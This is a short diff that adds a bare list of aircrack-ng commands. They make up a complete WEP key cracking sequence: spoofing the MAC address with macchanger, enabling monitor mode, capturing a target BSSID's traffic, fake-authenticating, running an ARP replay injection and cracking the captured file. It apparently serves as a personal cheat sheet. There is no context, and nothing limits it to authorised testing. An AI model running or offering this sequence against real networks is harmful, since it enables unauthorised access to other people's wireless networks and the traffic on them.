@@ -1,0 +1,10 @@
+airmon-ng stop (interface)
+ifconfig (interface) down
+macchanger --mac 00:11:22:33:44:55 (interface)
+airmon-ng start (interface)
+airodump-ng (interface)
+airodump-ng -c (channel) -w (file name) --bssid (bssid) (interface)
+aireplay-ng -1 0 -a (bssid) -h 00:11:22:33:44:55 -e (essid) (interface)
+aireplay-ng -3 -b (bssid) -h 00:11:22:33:44:55 (interface)
+aircrack-ng -b (bssid) (file name-01.cap)
+
